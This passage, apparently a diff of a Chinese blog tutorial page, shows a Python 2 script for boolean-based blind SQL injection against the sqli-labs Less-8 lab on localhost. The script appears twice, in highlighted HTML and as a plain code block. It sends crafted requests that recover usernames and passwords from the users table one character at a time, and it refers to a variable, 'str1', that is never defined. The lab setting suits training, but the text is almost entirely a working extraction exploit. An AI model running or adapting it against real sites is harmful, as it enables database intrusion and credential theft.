&#39;%20and%20left((select%20password%20from%20users%20where%20id%20&#x3D;&#123;n&#125;),&#123;w&#125;)&#x3D;%27&#123;d&#125;%27%20--%20k&#39;</span><br><span class="line">for i in range(1, 15):</span><br><span class="line">    for j in range(1, 11):</span><br><span class="line">        for l in list1:</span><br><span class="line">            p &#x3D; payload2.format(n&#x3D;i, w&#x3D;j, d&#x3D;password[i-1]+l)</span><br><span class="line">            u &#x3D; requests.get(url+p)</span><br><span class="line">            if str1 in u.content:</span><br><span class="line">                password[i-1] +&#x3D; l</span><br><span class="line">                print u&#39;正在对比第&#39;, i, u&#39;个记录的password的第&#39;, j, u&#39;个字符&#39;, password[i-1]</span><br><span class="line">print &#39;id    username    password&#39;</span><br><span class="line">for i in range(1, 15):</span><br><span class="line">    print i, &#39;-&#39;, username[i-1], &#39;-&#39;, password[i-1]</span><br><span class="line">a &#x3D; raw_input()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code># -*- coding:utf8 -*-
+import requests
+list1 = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, 
+         &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;@&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;0&#39;, &#39;!&#39;, &#39;-&#39;, &#39;|&#39;, &#39;_&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, 
+         &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, 
+         &#39;Z&#39;, &#39;.&#39;]  # 字典
+url = &#39;http://127.0.0.1/sqli-labs-master/Less-8?id=1%27&#39;
+payload = &#39;%20and%20left((select%20username%20from%20users%20where%20id%20=&#123;n&#125;),&#123;w&#125;)=%27&#123;d&#125;%27%20--%20k&#39;
+str = &#39;You are in...........&#39;
+username = [&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;]
+password = [&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;]
+for i in range(1, 15):
+    for j in range(1, 11):
+        for l in list1:
+            p = payload.format(n=i, w=j, d=username[i-1]+l)
+            u = requests.get(url+p)
+            if str in u.content:
+                username[i-1] += l
+                print u&#39;正在对比第&#39;, i, u&#39;个记录的username的第&#39;, j, u&#39;个字符&#39;, username[i-1]
+payload2 = &#39;%20and%20left((select%20password%20from%20users%20where%20id%20=&#123;n&#125;),&#123;w&#125;)=%27&#123;d&#125;%27%20--%20k&#39;
+for i in range(1, 15):
+    for j in range(1, 11):
+        for l in list1:
+            p = payload2.format(n=i, w=j, d=password[i-1]+l)
+            u = requests.get(url+p)
+            if str1 in u.content:
+                password[i-1] += l
+                print u&#39;正在对比第&#39;, i, u&#39;个记录的password的第&#39;, j, u&#39;个字符&#39;, password[i-1]
+print &#39;id    username    password&#39;
+for i in range(1, 15):
+    print i, &#39;-&#39;, username[i-1], &#39;-&#39;, password[i-1]
+a = raw_input()
+</code></pre>
 <p><img src="http://img-blog.csdnimg.cn/20190729215820731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190729215835960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用脚本盲注基本就是这些了，关于burp爆破就过段时间在写吧。(●’◡’●)</p>
 
       
